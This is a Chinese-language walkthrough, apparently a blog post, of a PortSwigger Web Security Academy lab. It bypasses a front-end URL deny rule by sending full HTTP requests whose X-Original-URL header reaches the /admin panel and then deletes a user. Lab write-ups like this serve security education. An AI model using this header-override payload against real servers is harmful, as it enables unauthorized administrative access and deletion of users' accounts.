有时应用程序可能配置有：

```javascript
DENY: POST, /admin/deleteUser, managers
```



## 不允许用户访问/admin/deleteUser目录



## 访问admin panel网页立马返回 "Access denied"

## 推测可能是前端进行了检测。尝试使用X-Original-Url : 绕过



## 1. 访问admin:

```javascript
// 前端认为只访问了/目录。不做拦截
GET / HTTP/1.1
Host: ac311fd21e5434f680714ea6005a00da.web-security-academy.net
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ac311fd21e5434f680714ea6005a00da.web-security-academy.net/
//服务端通过X-Original-URL判断url。认为请求了/admin目录
X-Original-URL: /admin
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: session=F8fRZQ1Ikq1pcAfkPO8yX7dTQIMb7GUm


```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/访问控制漏洞和特权升级/images/FE6AE4619A494667B65D76CA62DAEBDAclipboard.png)



## 2. 删除用户：

```javascript
//传递的参数
GET /?username=wiene HTTP/1.1
Host: ac311fd21e5434f680714ea6005a00da.web-security-academy.net
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ac311fd21e5434f680714ea6005a00da.web-security-academy.net/
//访问/admin/delete目录
X-Original-URL: /admin/delete
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: session=F8fRZQ1Ikq1pcAfkPO8yX7dTQIMb7GUm

```

